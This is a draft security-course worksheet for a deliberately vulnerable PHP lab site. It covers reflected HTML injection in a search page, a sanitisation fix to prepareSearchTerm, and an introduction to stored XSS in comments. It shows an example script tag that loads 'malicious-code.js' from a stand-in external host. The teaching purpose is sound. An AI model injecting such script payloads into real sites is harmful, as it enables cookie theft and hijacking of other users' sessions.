**DRAFT**

Worksheet
========================================================================

Preparation
___________

Start the Virtual Machine and use a browser to navigate to the
web application (port 12342) and Usermin (port 12323).

After logging in, Usermin will show you the contents of ``/home/student``, from
which you can access the web application's code in the ``webapp`` folder.

The web application is a sample website designed to demonstrate
some security vulnerabilities, including those explained in this worksheet.

The first step is to familiarise with the website. You can create an
accout using the "Register" link at the top of the page. The website
allows users to login, view articles, comment them and


Unsanitised output
_____________________

Try and use the search function of the website. This page simply
searches the database for articles by their title.

In this website, the search input is not appropriately sanitised.
Notice that the search functionality of the website returns a webpage with
a heading which counts the number of results and echoes back the search
terms used (i.e. searching for ``Lorem ipsum`` will print
 ``4 results for "Lorem ipsum"``).

If you insert some HTML code into the input bar, you can notice that
this is not correctly filtered by the application.
For example, if you write ``<u>Hello</u>``,
you can see that the webpage now shows the text underlined, as opposed
to displaying the caracters as they have been typed. This is
because the HTML ``<u>...</u>`` tag is responsible for underlining text,
and the unfiltered text is interpreted as HTML code by the browser.

**Exploit this functionality to display an arbitrary image from
  the internet in the search page.**

Hint:
    Try searching the internet for ways to display an image in HTML.

This type of attack is known as *non-persistent*, because the result is
not saved in the website's database, and it needs the attacker to share
the link of the resulting search results page and it only affects users
which click on the malicious link.


Fix the search
______________

The webpage which is responsible for the search is available for you to
edit from Usermin in ``/home/student/webapp/pages/search.php``. You can
make changes to the file, save and reload the webpage to check the result.

If things go wrong and you want to restore the inital version of the file,
simply delete your VM and restart it from a fresh copy.

**TODO: Maybe provide something easier to reset the code?**

PHP files (``.php``) contain HTML code and they may contain some PHP code
between ``<?php`` and ``?>`` tags. PHP code is processed by the server when
a webpage is requested, its output is mixed with the HTML page and only
HTML is returned to the client.

Variables stat with a dollar sign (``$``) and all instructions must terminate
with a semicolon (``;``), similar to the C language. PHP is a very popular
language in web development and you can find its documentation at
http://php.net/manual/en/langref.php.

The ``prepareSearchTerm`` function is used to prepare the string before it
is used to search the articles of the website.

**Change the ``prepareSearchTerm`` function to fix the vulnerability.**
**Then test that the string you prepared in the previous excercise,
is now innocuous and can't be used to display an image.**

Hint:
    There are a couple of ways you can implement the fix to prevent
    HTML markup from being injected. Symbols, if are not
    intended to be interpreted as code, should be encoded in their
    hexadecimal HTML notation, e.g. ``£`` can be written
    as ``&#163;`` (or its memorable equivalent ``&pound;``).


Injecting Javascript Code
_________________________

Injecting simple formatting in webpages may temporarely
disrupt the layout of the webpage but is not generally a security risk.

Images can be a risk for privacy in some cases, for example if the
image is served by a webserver which is under the control of the attacker,
this can be used to retrieve information about the end user, such as
IP address, the browser used, and whether the user has opened the webpage
or not (this tecquique is known as `web beacon <https://en.wikipedia.org/wiki/Web_beacon>`_).

Probably, the most dangerous HTML code which can be injected into webpages
is Javascript code. This code is automatically executed by the web browser
as soon as it is encountered, and permits a broad range of operations, such as
the manipulation of the DOM (structure of the page), reading cookies and
sending HTTP requests.

There are two ways to insert Javascript in a HTML file:

1. Using a ``<script>...</script>`` tag, including the Javascript code directly
   in between the tags, or

2. Hosting the script on different web server, and injecting it using:
   ``<script src="http://example.com/malicious-code.js"></script>``. This
   is known XSS, or Cross-site scripting, and is a particular case of
   Code injection.

The comments section of the website is vulnerable to XSS but this time
the content of the comments is saved to the database, therefore this
application is vulnerable to *permanent XSS attacks*, which can be vary
dangerous.
